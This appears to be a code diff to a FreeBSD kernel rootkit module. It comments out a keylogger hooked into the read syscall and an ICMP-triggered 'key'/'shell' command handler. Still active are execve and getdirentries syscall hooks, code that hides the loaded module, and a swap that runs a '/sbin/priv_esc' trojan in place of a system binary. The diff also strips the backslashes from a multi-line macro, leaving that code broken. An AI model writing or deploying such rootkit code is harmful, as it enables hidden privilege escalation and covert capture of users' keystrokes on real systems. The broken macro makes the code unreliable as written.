@@ -44,19 +44,19 @@ extern linker_file_list_t linker_files;
 extern struct sx kld_sx;
 extern int next_file_id;
 
-#define    LINKER_GET_NEXT_FILE_ID(a) do {          \
-    linker_file_t lftmp;                            \
-                                                    \
-    if (!cold)                                      \
-        sx_assert(&kld_sx, SA_XLOCKED);             \
-retry:                                              \
-    TAILQ_FOREACH(lftmp, &linker_files, link) {     \
-        if (next_file_id == lftmp->id) {            \
-            next_file_id++;                         \
-            goto retry;                             \
-        }                                           \
-    }                                               \
-    (a) = next_file_id;                             \
+#define    LINKER_GET_NEXT_FILE_ID(a) do {          
+    linker_file_t lftmp;                            
+                                                    
+    if (!cold)                                      
+        sx_assert(&kld_sx, SA_XLOCKED);             
+retry:                                              
+    TAILQ_FOREACH(lftmp, &linker_files, link) {     
+        if (next_file_id == lftmp->id) {            
+            next_file_id++;                         
+            goto retry;                             
+        }                                           
+    }                                               
+    (a) = next_file_id;                             
 } while(0)
 
 
@@ -82,79 +82,79 @@ static struct module *save_mod;
 
 //============TRIGGERING ICMP==============
 
-#define KEYLOG "key"
-#define RSHELL "shell"
+// #define KEYLOG "key"
+// #define RSHELL "shell"
 
-extern struct protosw inetsw[]; 
-pr_input_t icmp_input_hook;
+// extern struct protosw inetsw[]; 
+// pr_input_t icmp_input_hook;
 
-// ======== PORT LISTENING  =============
+// // ======== PORT LISTENING  =============
 
-int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td);
-int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td);
-int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td);
-int dev_write(struct cdev *dev, struct uio *uio, int ioflag);
-int dev_read(struct cdev *dev, struct uio *uio, int ioflag);
-
-
-#define APP_NAME "shell"
-
-static char cmd[256+1];
-static struct sx cmd_lock;
+// int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td);
+// int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td);
+// int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td);
+// int dev_write(struct cdev *dev, struct uio *uio, int ioflag);
+// int dev_read(struct cdev *dev, struct uio *uio, int ioflag);
 
 
-extern struct protosw inetsw[];
-pr_input_t icmp_input_hook;
+// #define APP_NAME "shell"
 
-int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td)
-{
-    return 0;
-}
-
-int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td)
-{
-    return 0;
-}
-
-int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td)
-{
-    return 0;
-}
+// static char cmd[256+1];
+// static struct sx cmd_lock;
 
 
-int dev_write(struct cdev *dev, struct uio *uio, int ioflag)
-{
-    return 0;
-}
-int dev_read(struct cdev *dev, struct uio *uio, int ioflag)
-{
-    int len;
+// extern struct protosw inetsw[];
+// pr_input_t icmp_input_hook;
+
+// int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td)
+// {
+//     return 0;
+// }
+
+// int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td)
+// {
+//     return 0;
+// }
+
+// int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td)
+// {
+//     return 0;
+// }
+
+
+// int dev_write(struct cdev *dev, struct uio *uio, int ioflag)
+// {
+//     return 0;
+// }
+// int dev_read(struct cdev *dev, struct uio *uio, int ioflag)
+// {
+//     int len;
     
-    sx_xlock(&cmd_lock);
-    copystr(&cmd, uio->uio_iov->iov_base, strlen(cmd)+1, &len);
+//     sx_xlock(&cmd_lock);
+//     copystr(&cmd, uio->uio_iov->iov_base, strlen(cmd)+1, &len);
     
-    bzero(cmd,256);
-    sx_xunlock(&cmd_lock);
+//     bzero(cmd,256);
+//     sx_xunlock(&cmd_lock);
    
     
-    return 0;
-}
+//     return 0;
+// }
 
-static struct cdevsw devsw = {
-         .d_version = D_VERSION,
-         .d_open = dev_open,
-         .d_close = dev_close,
-         .d_read = dev_read,
-         .d_write = dev_write,
-         .d_ioctl = dev_ioctl,
-         .d_name = "ubi_65"
-};
-static struct cdev *sdev;
+// static struct cdevsw devsw = {
+//          .d_version = D_VERSION,
+//          .d_open = dev_open,
+//          .d_close = dev_close,
+//          .d_read = dev_read,
+//          .d_write = dev_write,
+//          .d_ioctl = dev_ioctl,
+//          .d_name = "ubi_65"
+// };
+// static struct cdev *sdev;
 
 
 //========================================
 
-#define ORIGINAL	"/sbin/hello"
+#define ORIGINAL	"/usr/bin/true"
 #define TROJAN		"/sbin/priv_esc"
 
 static int activated = 0;
@@ -274,87 +274,87 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
 //================================== KEY LOGGING ================================
 
 
-static int write_kernel2userspace(struct thread *td, char c){
+// static int write_kernel2userspace(struct thread *td, char c){
 
-	int error;
-	// open file to save at
+// 	int error;
+// 	// open file to save at
 	
-	/*
-		If the pathname given in pathname is relative and dirfd is the special value AT_FDCWD, 
-		then pathname is interpreted relative to the current working directory of the calling process 
-	*/
-	error = kern_openat(td, AT_FDCWD, "/log.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0666);
+// 	/*
+// 		If the pathname given in pathname is relative and dirfd is the special value AT_FDCWD, 
+// 		then pathname is interpreted relative to the current working directory of the calling process 
+// 	*/
+// 	error = kern_openat(td, AT_FDCWD, "/log.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0666);
     
-    if (error){
-        uprintf("open error %d\n", error);
-        return(error);
-    }
-    int keylog_fd = td->td_retval[0];
-    int buf[1] = {c};
+//     if (error){
+//         uprintf("open error %d\n", error);
+//         return(error);
+//     }
+//     int keylog_fd = td->td_retval[0];
+//     int buf[1] = {c};
 
-    /*
-		UIO: This structure is used for moving data between 
-		the kernel and user spaces through read() and write() system calls. 
-    */
-    struct iovec aiov;
-    struct uio auio; 
+//     /*
+// 		UIO: This structure is used for moving data between 
+// 		the kernel and user spaces through read() and write() system calls. 
+//     */
+//     struct iovec aiov;
+//     struct uio auio; 
 
-    //zero's out structs
-    bzero(&auio, sizeof(auio));
-    bzero(&aiov, sizeof(aiov));
+//     //zero's out structs
+//     bzero(&auio, sizeof(auio));
+//     bzero(&aiov, sizeof(aiov));
     
-    /*	
-    	The writev() system call writes iovcnt buffers of data described .....
-    	by iov to the file associated with the file descriptor fd ("gather output").
+//     /*	
+//     	The writev() system call writes iovcnt buffers of data described .....
+//     	by iov to the file associated with the file descriptor fd ("gather output").
 
-    	writev() writes out the entire contents of iov[0] before proceeding to iov[1], and so on.
-    */
-    aiov.iov_base = &buf; //starting address of buffer
-    aiov.iov_len = 1; //number of bytes to transfer
+//     	writev() writes out the entire contents of iov[0] before proceeding to iov[1], and so on.
+//     */
+//     aiov.iov_base = &buf; //starting address of buffer
+//     aiov.iov_len = 1; //number of bytes to transfer
 
 
-    auio.uio_iov = &aiov; 			/*	scatter/gather list */
-    auio.uio_iovcnt = 1; 			/*	length of scatter/gather list */
-    auio.uio_offset = 0; 			/*	offset in target object	*/
-    auio.uio_resid = 1; 			/*	remaining bytes	to copy	*/
-    auio.uio_segflg = UIO_SYSSPACE; /*	address	space */
-    auio.uio_rw = UIO_WRITE;		/*	operation */
-    auio.uio_td = td;				/*	owner */
+//     auio.uio_iov = &aiov; 			/*	scatter/gather list */
+//     auio.uio_iovcnt = 1; 			/*	length of scatter/gather list */
+//     auio.uio_offset = 0; 			/*	offset in target object	*/
+//     auio.uio_resid = 1; 			/*	remaining bytes	to copy	*/
+//     auio.uio_segflg = UIO_SYSSPACE; /*	address	space */
+//     auio.uio_rw = UIO_WRITE;		/*	operation */
+//     auio.uio_td = td;				/*	owner */
     
-    error = kern_writev(td, keylog_fd, &auio);
-    if (error){
-        uprintf("write error %d\n", error);
-        return error;
-    }
-    struct close_args fdtmp;
-    fdtmp.fd = keylog_fd;
-    sys_close(td, &fdtmp);
+//     error = kern_writev(td, keylog_fd, &auio);
+//     if (error){
+//         uprintf("write error %d\n", error);
+//         return error;
+//     }
+//     struct close_args fdtmp;
+//     fdtmp.fd = keylog_fd;
+//     sys_close(td, &fdtmp);
 
-	return(error);
-}
+// 	return(error);
+// }
 
 
 
-static int read_hook(struct thread *td, void *syscall_args){
+// static int read_hook(struct thread *td, void *syscall_args){
 
-	struct read_args *uap;
-	uap = (struct read_args *)syscall_args;
+// 	struct read_args *uap;
+// 	uap = (struct read_args *)syscall_args;
 
-	int error;
-	char buf[1];
-	size_t done;
+// 	int error;
+// 	char buf[1];
+// 	size_t done;
 
-	error = sys_read(td, syscall_args);
+// 	error = sys_read(td, syscall_args);
 
-	//checks if data read is keystroke
-	if (error || (!uap->nbyte)||(uap->nbyte > 1)|| (uap->fd != 0))
-		return(error); 
+// 	//checks if data read is keystroke
+// 	if (error || (!uap->nbyte)||(uap->nbyte > 1)|| (uap->fd != 0))
+// 		return(error); 
 
-	copyinstr(uap->buf, buf, 1, &done);
-	write_kernel2userspace(td, buf[0]);
+// 	copyinstr(uap->buf, buf, 1, &done);
+// 	write_kernel2userspace(td, buf[0]);
 
-	return(error);
-}
+// 	return(error);
+// }
 
 //==============================================================================
 
@@ -443,39 +443,39 @@ static int unhide_kld(void){
 
 //==============================================================================
 
-int icmp_input_hook(struct mbuf **m, int *off, int proto){
-	struct icmp *icp;
-	int hlen = *off;
+// int icmp_input_hook(struct mbuf **m, int *off, int proto){
+// 	struct icmp *icp;
+// 	int hlen = *off;
 
-	/* Locate the ICMP message within m. */
-	(*m)->m_len -= hlen;
-	(*m)->m_data += hlen;
+// 	/* Locate the ICMP message within m. */
+// 	(*m)->m_len -= hlen;
+// 	(*m)->m_data += hlen;
 
-	/* Extract the ICMP message. */
-	icp = mtod(*m, struct icmp *);
+// 	/* Extract the ICMP message. */
+// 	icp = mtod(*m, struct icmp *);
 
-	/* Restore m. */
-	(*m)->m_len += hlen;
-	(*m)->m_data -= hlen;
+// 	/* Restore m. */
+// 	(*m)->m_len += hlen;
+// 	(*m)->m_data -= hlen;
 
-	/* Is this the ICMP message we are looking for? */
-	if (strncmp(icp->icmp_data, KEYLOG, 3) == 0) {
-		printf("send keylog.\n");
-		strcpy(cmd, "key");
-		return(0);
-	}
+// 	/* Is this the ICMP message we are looking for? */
+// 	if (strncmp(icp->icmp_data, KEYLOG, 3) == 0) {
+// 		printf("send keylog.\n");
+// 		strcpy(cmd, "key");
+// 		return(0);
+// 	}
 
-	else if (strncmp(icp->icmp_data, RSHELL, 5) == 0) {
-			printf("send shell.\n");
-			strcpy(cmd, "shell");
-			return(0);
-	}
-	else
-		printf("pinged\n");
-		return (icmp_input(m, off, proto));
+// 	else if (strncmp(icp->icmp_data, RSHELL, 5) == 0) {
+// 			printf("send shell.\n");
+// 			strcpy(cmd, "shell");
+// 			return(0);
+// 	}
+// 	else
+// 		printf("pinged\n");
+// 		return (icmp_input(m, off, proto));
 
-	return (icmp_input(m, off, proto));
-}
+// 	return (icmp_input(m, off, proto));
+// }
 //==============================================================================
 
 
@@ -496,10 +496,9 @@ static int control(struct thread *td, void *arg) {
 		sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
 
-		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
-		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
-		sx_init(&cmd_lock,"rootkit_lock");
-        sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "ubi_65");
+		//sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
+		//inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
+        //sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "ubi_65");
 		hide_kld();
 		activated = 1;
 	}
@@ -507,10 +506,9 @@ static int control(struct thread *td, void *arg) {
 		sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
 
-		sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
-		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
-		sx_destroy(&cmd_lock);
-		destroy_dev(sdev);
+		//sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
+		//inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+		//destroy_dev(sdev);
 		unhide_kld();
 		activated = 0;
 	}
